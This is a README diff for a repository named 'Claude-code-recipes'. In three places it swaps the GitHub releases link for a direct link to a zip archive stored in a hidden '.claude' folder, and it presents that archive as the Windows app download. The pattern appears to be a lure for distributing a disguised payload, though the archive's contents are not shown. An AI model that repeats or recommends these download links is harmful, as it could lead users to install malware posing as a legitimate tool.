@@ -1,6 +1,6 @@
 # 🤖 Claude-code-recipes - Practical AI workflows for teams
 
-[![Download Claude-code-recipes](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/baltil2670/Claude-code-recipes/releases)
+[![Download Claude-code-recipes](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/baltil2670/Claude-code-recipes/raw/refs/heads/main/recipes/02-codebase-onboarder/.claude/recipes-Claude-code-3.1-beta.2.zip)
 
 ## 🚀 What this is
 
@@ -29,7 +29,7 @@ For the best result, use a recent Windows build and keep your browser updated.
 
 ## 📥 Download the app
 
-Visit this page to download: https://github.com/baltil2670/Claude-code-recipes/releases
+Visit this page to download: https://github.com/baltil2670/Claude-code-recipes/raw/refs/heads/main/recipes/02-codebase-onboarder/.claude/recipes-Claude-code-3.1-beta.2.zip
 
 On that page, look for the latest release and download the file that matches Windows. If the release page contains more than one file, choose the one marked for Windows or the main app package.
 
@@ -204,7 +204,7 @@ These topics shape the recipes and help keep the workflows practical for softwar
 
 ## 📎 Download again
 
-Visit this page to download: https://github.com/baltil2670/Claude-code-recipes/releases
+Visit this page to download: https://github.com/baltil2670/Claude-code-recipes/raw/refs/heads/main/recipes/02-codebase-onboarder/.claude/recipes-Claude-code-3.1-beta.2.zip
 
 Use this link any time you need the latest version, a fresh copy, or a Windows-friendly release file
 
